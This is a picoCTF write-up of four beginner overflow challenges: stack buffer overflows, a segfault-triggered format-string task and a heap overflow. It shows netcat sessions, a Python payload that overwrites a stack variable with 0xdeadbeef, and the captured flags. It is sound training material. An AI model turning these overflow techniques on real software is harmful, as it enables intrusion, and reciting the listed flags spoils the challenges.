# 1. Buffer overflow 0
>Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.
Connect using:
nc saturn.picoctf.net 49832

## Solution:
- I open the c code and read it thorougly
- I see that the print function uses a 'sigsedv' function
- It means that the flag is printed when a segmentation fault is triggered
- Segmentation fault happens when a program tries to access memory that is restricted or that doesnt exist at all.
- Also we see that the input is taken using a `gets()` function.
- `gets()` is known to be notorious with buffer overflows, that means it will write input to a stack without knowing its allocated length
- So if just we write an input long enough we can artificially trigger a segementation fault
- So i turn on the instance and just type a very long input
- That gives away the flag

```
shaunak@Shaunaks-MacBook-Pro ~ % nc saturn.picoctf.net 49832

Input: vcbnmvcxzcvbcxsertefghcbvxzsrtyjuhgfdsgdhfjhkjhgfdshjkl
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
shaunak@Shaunaks-MacBook-Pro ~ % 
```

## Flag:
```
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## Concepts learnt:
- Segementation Fault
- Buffer overflow
- I kinda knew what these are but still got a refresher course

## Notes:
- none

## Resources:
- https://stackoverflow.com/questions/1564372/what-causes-a-sigsegv
- http://stackoverflow.com/questions/18986351/what-is-the-simplest-standard-conform-way-to-produce-a-segfault-in-c

***

# 2. format string 0
> Can you use your knowledge of format strings to make the customers happy?
Download the binary here.
Download the source here.
Connect with the challenge instance here:
nc mimas.picoctf.net 58666

## Solution:
- LMAO this is the same as the last one, this one also uses a sigsev function
- so my first thought as soon as i opened the netcat was to just put a very looooong input and boom there was the flag lol

```
shaunak@Shaunaks-MacBook-Pro ~ % nc mimas.picoctf.net 58666
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: gfsdhghjkgfdgsfhgjklhgkfjhdsghfjkl;hgkfhdsgfgdfjgkhljhgfzx
There is no such burger yet!

picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}
shaunak@Shaunaks-MacBook-Pro ~ % 
```

## Flag:

```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_63191ce6}
```

## Concepts learnt:
- same as the last one, i didnt even read the code past the 1st function

## Notes:
- this was my fastest solve yet, under a minute

## Resources:
- same as last one

***

# 3. Clutter Overflow
> Clutter, clutter everywhere and not a byte to use.
nc mars.picoctf.net 31890

## Solution:
- At first I expected a one-trick-pony solution (send a very long input) but that didn’t work.
- Reading the source revealed a gets() call that reads user input into clutter without bounds checking, so clutter can overflow into adjacent stack variables.
- The program checks a local long code against 0xdeadbeef, so the goal is to overwrite code with that value.
- I constructed a binary payload (b"A"*256 + packed_value) and piped it to the challenge, but the test failed at first.
  ```
  import sys, struct
  sys.stdout.buffer.write(b"A"*256 + struct.pack("<Q", 0xdeadbeef) + b"\n")
  
  ```
- By incrementing the filler I found that overwriting succeeded when I sent 264 bytes before the value.
- this most probably because the compiler is adding an 8 byte buffer itself
- so the final payload was
  ```
  import sys, struct
  sys.stdout.buffer.write(b"A"*264 + struct.pack("<Q", 0xdeadbeef) + b"\n")
  ```
- Sending that payload triggered the if (code == GOAL) branch and printed the flag.

```
┌──(shaunakkli㉿shaunakkali)-[~]
└─$ python3 cluovf.py | nc mars.picoctf.net 31890
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}

```

## Flag:

```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Concepts learnt:
- Calculating the exact offset needed to overwrite the local variable and write the value 0xdeadbeef


***
# 4. Heap
> Are overflows just a stack concern?
Download the binary here.
Download the source here.
Connect with the challenge instance here:
nc tethys.picoctf.net 56915
## Solution

```
shaunak@Shaunaks-MacBook-Pro ~ % nc tethys.picoctf.net 56915

Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x555eb4b162b0  ->   pico
+-------------+----------------+
[*]   0x555eb4b162d0  ->   bico
+-------------+----------------+

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 3


Take a look at my variable: safe_var = AAAAAAAA


1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_749119de}
shaunak@Shaunaks-MacBook-Pro ~ %
```
